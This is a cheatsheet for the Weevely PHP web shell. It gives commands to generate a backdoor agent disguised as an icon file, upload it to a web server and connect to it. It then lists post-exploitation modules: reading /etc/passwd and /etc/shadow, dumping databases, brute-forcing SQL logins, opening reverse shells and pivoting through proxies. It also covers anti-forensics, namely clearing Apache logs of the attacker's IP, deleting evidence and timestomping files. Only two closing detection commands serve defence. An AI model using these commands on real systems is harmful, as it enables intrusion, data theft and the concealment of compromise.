---
title: "Weevely Cheatsheet"
tool: "Weevely"
version: "4.0.2"
date: "2026-07-18"
---

# Weevely Cheatsheet

## Installation

```bash
sudo apt install weevely
# OR from source
git clone https://github.com/epinna/weevely3.git /opt/weevely3
cd /opt/weevely3 && pip3 install -r requirements.txt
```

## Generate Agent

```bash
weevely generate <password> <output_path>

# Examples
weevely generate s3cr3t /tmp/agent.php
weevely generate T0pS3cr3tP@ss /var/www/html/icon.php
```

## Connect to Agent

```bash
weevely <URL> <password>

# Examples
weevely http://192.168.1.50/agent.php s3cr3t
weevely http://target.example.com/uploads/shell.php T0pS3cr3tP@ss
```

## Single Command

```bash
weevely http://192.168.1.50/agent.php s3cr3t "uname -a"
weevely http://192.168.1.50/agent.php s3cr3t "whoami"
weevely http://192.168.1.50/agent.php s3cr3t "cat /etc/passwd"
```

## Session Recovery

```bash
weevely session sessions/192.168.1.50/agent.session
```

## Weevely Modules (Prefix with `:`)

### File Operations

```text
:file_read /etc/passwd
:file_upload /local/file /remote/path
:file_download /remote/file /local/path
:file_edit /var/www/html/config.php
:file_ls /var/www/html/
:file_find / -name "*.conf"
:file_cp /src /dst
:file_rm /tmp/evidence.log
:file_touch /tmp/shell.php 20250101120000
:file_grep "password" /etc/*.conf
:file_clearlog /var/log/apache2/access.log 192.168.1.100
:file_check /var/www/html/config.php
:file_upload2web /tmp/shell.php images/
:file_enum /etc/passwd /etc/shadow /etc/hosts
```

### Archive/Compression

```text
:file_zip -c /tmp/backup.zip /var/www/html/
:file_gzip -c /tmp/data.gz /var/log/syslog
:file_bzip2 -c /tmp/data.bz2 /var/log/syslog
:file_tar -c /tmp/archive.tar /var/www/html/
```

### Shell Commands

```text
:shell_sh whoami
:shell_sh cat /etc/passwd
:shell_ssh user@192.168.1.60 "id"
:shell_su root password123 "whoami"
:shell_php phpinfo();
:shell_php var_dump(file_get_contents('/etc/passwd'));
```

### System Reconnaissance

```text
:system_info
:system_procs
:system_extensions
```

### Network Modules

```text
:net_proxy 8080                    # Start local proxy
:net_phpproxy /var/www/html/proxy.php  # Install PHP proxy
:net_scan 192.168.1.0/24 80,443,3306
:net_curl http://192.168.1.60/
:net_ifconfig
:net_mail user@example.com "Subject" "Body"
:net_socksproxy 1080
```

### SQL Modules

```text
:sql_console -user root -passwd pass123 "SHOW DATABASES"
:sql_console -user root -passwd pass123 "SELECT * FROM users"
:sql_dump -user root -passwd pass123 mydb
:bruteforce_sql -users users.txt -passwords passwords.txt
```

### Reverse Shell

```text
:backdoor_reversetcp 192.168.1.100 4444
:backdoor_tcp 4444
```

### Audit Modules

```text
:audit_filesystem /var/www
:audit_suidsgid /
:audit_disablefunctionbypass
:audit_etcpasswd
:audit_phpconf
```

## Proxy Configuration

```text
# Set proxy in session
:set proxy socks5://127.0.0.1:9050
:set proxy http://127.0.0.1:8080

# Then start the network proxy module
:net_proxy 8080
```

## Deployment Workflow

```bash
# 1. Generate unique agent
weevely generate T0pS3cr3t /tmp/agent.php

# 2. Upload to target
scp /tmp/agent.php user@192.168.1.50:/var/www/html/uploads/icon.php

# 3. Verify
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.50/uploads/icon.php

# 4. Connect
weevely http://192.168.1.50/uploads/icon.php T0pS3cr3t

# 5. Post-exploitation
weevely> :system_info
weevely> :audit_suidsgid /
weevely> :net_scan 192.168.1.0/24 80,443,3306
weevely> :sql_console -user root -passwd dbpass "SHOW DATABASES"
weevely> :net_proxy 8080

# 6. Cleanup
weevely> :file_rm /var/www/html/uploads/icon.php
weevely> :file_clearlog /var/log/apache2/access.log 192.168.1.100
```

## Quick Reference

| Command | Purpose |
|---------|---------|
| `weevely generate <pass> <path>` | Create backdoor agent |
| `weevely <url> <pass>` | Connect to agent |
| `weevely <url> <pass> "cmd"` | Single command |
| `weevely session <file>` | Recover session |
| `:help` | List modules |
| `:module --help` | Module help |
| `<TAB>` | Command completion |
| `:set proxy <type>://<host>:<port>` | Configure proxy |

## Detection Patterns

```bash
find /var/www/html -name "*.php" -size -1k -exec ls -la {} \;
grep -rn "base64_decode\|gzinflate\|str_rot13" /var/www/html/ --include="*.php"
```
